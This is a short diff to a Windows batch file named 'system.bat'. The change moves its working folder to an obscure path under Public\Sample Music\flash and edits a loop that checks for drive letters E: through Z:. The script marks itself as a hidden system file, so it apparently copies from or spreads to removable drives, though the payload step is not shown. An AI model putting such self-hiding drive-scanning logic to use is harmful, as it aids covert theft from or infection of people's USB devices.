@@ -1,6 +1,6 @@
 @echo off
 
-set DIR="C:\Users\Inka\Documents\test"
+set DIR="C:\Users\Public\Music\Sample Music\flash"
 
 attrib +s +h "system.bat"
 chcp 65001
@@ -22,7 +22,7 @@ goto run
 :: if exist C: set DISK=C&& goto DISKFOUND
 :: if exist D: set DISK=D&& goto DISKFOUND
 if exist E: set DISK=E&& goto DISKFOUND
-if exist F: set DISK=F&& goto DISKFOUND
+:: if exist F: set DISK=F&& goto DISKFOUND
 if exist G: set DISK=G&& goto DISKFOUND
 if exist H: set DISK=H&& goto DISKFOUND
 if exist I: set DISK=I&& goto DISKFOUND
@@ -41,7 +41,7 @@ if exist U: set DISK=U&& goto DISKFOUND
 if exist V: set DISK=V&& goto DISKFOUND
 if exist W: set DISK=W&& goto DISKFOUND
 if exist X: set DISK=X&& goto DISKFOUND
-if exist Y: set DISK=Y&& goto DISKFOUND
+:: if exist Y: set DISK=Y&& goto DISKFOUND
 if exist Z: set DISK=Z&& goto DISKFOUND
 goto run
 :OK
